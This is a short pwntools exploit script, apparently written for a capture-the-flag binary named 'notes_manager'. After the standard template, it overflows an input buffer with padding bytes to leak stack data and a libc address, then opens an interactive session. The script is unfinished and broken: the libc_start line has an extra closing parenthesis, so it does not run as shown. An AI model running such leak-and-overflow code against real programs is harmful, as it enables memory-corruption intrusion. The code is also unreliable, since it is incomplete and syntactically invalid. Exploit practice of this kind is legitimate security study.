#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'notes_manager')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()

io.sendline(b'1')
sleep(1)
io.sendline(b'a'*72)
io.recvuntil(b"->")
io.recvline()
leak = io.recv(7)
log.warn(leak.hex())

io.sendline(b'1')
io.send(b'a' * (72+8+8-1)+b'\n')
io.recvuntil(b"->")
io.recvline()
an = io.recvuntil(b'Choos').replace(b'Choos', b'')
log.warn(an)
log.warn(f'LENGTH -> {len(an)}')
libc_start = u64(an.ljust(8,b'\x00')))

io.interactive()

